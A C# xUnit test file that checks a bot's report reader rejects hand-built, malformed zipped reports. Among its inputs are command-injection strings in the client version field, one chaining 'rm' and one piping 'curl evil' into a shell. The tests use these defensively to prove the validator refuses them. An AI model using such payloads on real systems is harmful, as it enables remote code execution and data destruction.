using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using D3B.Bot.Reports;

namespace D3B.Bot.Tests.Reports;

/// <summary>Reports built by hand, as anyone who read the webhook's URL could post them: the reader must refuse them, never crash on them.</summary>
public sealed class ReportHandmadeTests
{
    private const string Code = "D3B-K7QM-4X";

    private static byte[] Zip(params (string Name, byte[] Data)[] entries)
    {
        using var stream = new MemoryStream();

        using (var zip = new ZipArchive(stream, ZipArchiveMode.Create, true))
        {
            foreach (var (name, data) in entries)
            {
                using var entry = zip.CreateEntry(name).Open();

                entry.Write(data);
            }
        }

        return stream.ToArray();
    }

    // The files, then a manifest of the test's making that lists them with the right sizes and hashes.
    private static byte[] Handmade(string manifest, params (string Name, byte[] Data)[] files)
    {
        var listed = string.Join(",", files.Select(file => $$"""{"name":"{{file.Name}}","size":{{file.Data.Length}},"sha256":"{{Convert.ToHexStringLower(SHA256.HashData(file.Data))}}"}"""));

        return Zip([.. files, (ReportFiles.Manifest, Encoding.UTF8.GetBytes(manifest.Replace("FILES", listed, StringComparison.Ordinal)))]);
    }

    private static string Manifest(string client = "\"3.7.13.17\"", string app = "\"0.8.1\"", bool hasMessage = false)
    {
        return $$"""{"code":"{{Code}}","createdAt":"2026-11-10T12:00:00+00:00","app":{{app}},"client":{{client}},"area":"app","hasMessage":{{(hasMessage ? "true" : "false")}},"files":[FILES]}""";
    }

    private static ReportBundle Read(byte[] zip)
    {
        return ReportReader.Read(new MemoryStream(zip));
    }

    [Fact]
    public void AHandmadeReportThatIsRightIsRead()
    {
        Assert.Equal(Code, Read(Handmade(Manifest(), (ReportFiles.Journal, [1]))).Manifest.Code);
    }

    [Theory]
    [InlineData("null")]
    [InlineData("\"\"")]
    [InlineData("\"3.7.13.17 && rm\"")]
    [InlineData("\"x\\\" ; curl evil|sh ; \\\"\"")]
    public void AClientThatIsNoVersionIsRefusedSoThatNoCommandIsMadeOfIt(string client)
    {
        Assert.Throws<ReportFormatException>(() => Read(Handmade(Manifest(client), (ReportFiles.Journal, [1]))));
    }

    [Theory]
    [InlineData("null")]
    [InlineData("\"line\\nbreak\"")]
    public void AnAppThatIsNullOrHoldsALineBreakIsRefused(string app)
    {
        Assert.Throws<ReportFormatException>(() => Read(Handmade(Manifest(app: app), (ReportFiles.Journal, [1]))));
    }

    [Theory]
    [InlineData("[null]")]
    [InlineData("[{\"size\":1}]")]
    [InlineData("[{\"name\":\"journal.txt\",\"size\":-1,\"sha256\":\"00\"}]")]
    public void AListOfFilesWithANullOrANonsenseEntryIsRefusedNotCrashedOn(string files)
    {
        var manifest = $$"""{"code":"{{Code}}","createdAt":"2026-11-10T12:00:00+00:00","app":"1","client":"3.7","area":"app","files":{{files}}}""";

        Assert.Throws<ReportFormatException>(() => Read(Zip((ReportFiles.Manifest, Encoding.UTF8.GetBytes(manifest)))));
    }

    [Fact]
    public void AMessageOfMoreThanTheLimitIsRefusedBeforeAnythingPrintsIt()
    {
        var message = Encoding.UTF8.GetBytes(new string('a', ReportContent.MessageLimit + 1));

        Assert.Throws<ReportFormatException>(() => Read(Handmade(Manifest(hasMessage: true), (ReportFiles.Message, message))));
        Assert.Equal(ReportContent.MessageLimit, Read(Handmade(Manifest(hasMessage: true), (ReportFiles.Message, message[..ReportContent.MessageLimit]))).Message!.Length);
    }

    [Fact]
    public void TwoEntriesOfOneNameWhateverTheirCaseAreRefused()
    {
        Assert.Throws<ReportFormatException>(() => Read(Handmade(Manifest(), ("assets/A.json", [1]), ("assets/a.json", [2]))));
        Assert.Throws<ReportFormatException>(() => Read(Zip((ReportFiles.Journal, [1]), (ReportFiles.Journal, [2]), (ReportFiles.Manifest, "{}"u8.ToArray()))));
    }

    [Theory]
    [InlineData("assets/nul.json")]
    [InlineData("assets/COM1.json")]
    [InlineData("assets/Aux.json")]
    public void TheNamesWindowsKeepsForDevicesAreNoAssets(string name)
    {
        Assert.False(ReportFiles.IsValid(name));
        Assert.Throws<ReportFormatException>(() => Read(Handmade(Manifest(), (name, [1]))));
    }
}
